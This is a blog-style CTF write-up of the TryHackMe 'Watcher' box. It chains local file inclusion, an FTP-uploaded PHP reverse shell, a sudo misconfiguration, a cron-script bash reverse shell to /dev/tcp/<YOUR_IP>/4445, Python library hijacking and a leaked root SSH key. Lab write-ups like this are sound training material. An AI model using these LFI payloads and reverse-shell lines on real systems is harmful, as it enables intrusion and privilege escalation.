---
layout: posts
title: "Watcher CTF Writeup"
date: 2026-01-06
categories: writeups
tags: Linux Boot2Root Web PrivEsc 
exerpt: A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.
difficulty: Medium
---

# TryHackMe: Watcher Writeup

**Difficulty:** {{page.difficulty}} | **Focus:** {{ page.tags | join: ', ' }}.

> **Room link:** [https://tryhackme.com/room/watcher](https://tryhackme.com/room/watcher)

Hey everyone! Today we’re diving into **Watcher**, a fun "boot2root" box on TryHackMe. This one is a great lesson in why you should never trust user input and, more importantly, why you should be careful with file permissions.

### Initial Setup
First things first, let’s make our lives easier by mapping the IP to a hostname:

`echo '<target_ip> watcher.thm' >> /etc/hosts`

---

## 1. Scouting the Perimeter (Flag 1)
I kicked things off with a standard nmap scan to see what we’re dealing with.

`nmap -v -p- watcher.thm`

**Open Ports:**
* **21 (FTP):** vsftpd 3.0.5
* **22 (SSH):** OpenSSH 8.2p1
* **80 (HTTP):** Apache 2.4.41

Since there's a web server, I fired up gobuster to see if there were any hidden gems.

* /index.php (Status: 200)
* /post.php (Status: 200)
* /robots.txt (Status: 200)

Navigating to robots.txt felt like hitting a mini-jackpot. It listed two files:
* /flag_1.txt 👈 **Found Flag 1!**
* /secret_file_do_not_read.txt (This gave me a 403 Forbidden. Challenge accepted.)

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/1.png" alt="Watcher 1"></div>

---

## 2. Exploiting Local File Inclusion (Flag 2)
Back on the main site, I noticed the URL looked a bit suspicious:

`http://watcher.thm/post.php?post=striped.php`

That post= parameter is a classic sign of **Local File Inclusion (LFI)**. If the dev isn't sanitizing that input, I might be able to read that "secret" file I couldn't access earlier. I gave it a shot:

`http://watcher.thm/post.php?post=./secret_file_do_not_read.txt`

**It worked!** The file contained a message for "Mat" with some FTP credentials:

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/2.png" alt="Watcher 2"></div>

I hopped over to the FTP server, logged in, and found **Found Flag 2!**. 


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/3.png" alt="Watcher 3"></div>

---

## 3. From LFI to RCE (Flag 3)
The secret note mentioned that FTP files are saved to /home/ftpuser/ftp/files. This is huge. If I can upload a file via FTP and then use my LFI vulnerability to "include" it, I can get code execution (RCE).

1.  I uploaded a simple PHP reverse shell (shell.php) via FTP.
2.  I triggered it using the LFI:

    `http://watcher.thm/post.php?post=../../../home/ftpuser/ftp/files/shell.php`

*Boom.* I had a shell as www-data. I ran a quick search to find the next flag:

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/4.png" alt="Watcher 4"></div>

`find / -type f -name 'flag_3.txt' 2>/dev/null`


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/5.png" alt="Watcher 5"></div>

---

## 4. Exploiting Sudo Misconfigurations (Flag 4)
Time to move up in the world. I checked my sudo privileges with **sudo -l** and saw something beautiful:
**(toby) NOPASSWD: ALL**

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/6.png" alt="Watcher 6"></div>

This means I can run anything as the user toby without a password. I just spawned a shell as him:

`sudo -u toby /bin/bash`

I headed over to /home/toby and picked up **Flag 4**.


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/7.png" alt="Watcher 7"></div>

---

## 5. The Second Pivot: Mat (Flag 5)
In Toby’s home directory, I found a note from "Mat" about cron jobs. Checking /etc/crontab, I saw this line:

`*/1 * * * * mat /home/toby/jobs/cow.sh`

Every minute, Mat runs a script located in Toby’s directory. Since I’m now Toby, I can edit that script! I replaced the contents of cow.sh with a bash reverse shell:


```
#!/bin/bash 
/bin/bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1
```


I set up my listener, waited a minute, and suddenly I was logged in as mat. **Flag 5** secured.


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/8.png" alt="Watcher 8"></div>

---

## 6. Python Library Hijacking (Flag 6)
Another user, another note. Mat had sudo rights to run a specific Python script as the user Will:

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/9.png" alt="Watcher 9"></div>

Looking at will_script.py, it imports a function from another file in the same folder called cmd.py.

```
import os
from cmd import get_command 
```

Since mat owns cmd.py, I can just hijack the library. I edited cmd.py and added a line to spawn a shell. 

<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/10.png" alt="Watcher 10"></div>


When I ran the will_script.py with sudo, it called my "malicious" library, and I became will. 

`sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *`


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/11.png" alt="Watcher 11"></div>

**Flag 6** found in /home/will.


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/12.png" alt="Watcher 12"></div>

---

## 7. Exploiting Group Permissions: Final Flag
Last step. I checked Will’s group memberships and found he was part of the adm group. This usually means access to logs or backups.

`find / -group adm 2>/dev/null`

I found /opt/backups/key.b64. Decoding it revealed a **Base64 encoded RSA private key**. 


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/13.png" alt="Watcher 13"></div>

I saved it to my machine, fixed the permissions (chmod 600), and tried to SSH in as root:

`ssh -i key root@watcher.thm`


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/14.png" alt="Watcher 14"></div>

Success! I was root. I grabbed the final flag and cleared the machine.


<div class="post-img"><img src="{{ site.baseurl }}/assets/img/watcher/15.png" alt="Watcher 15"></div>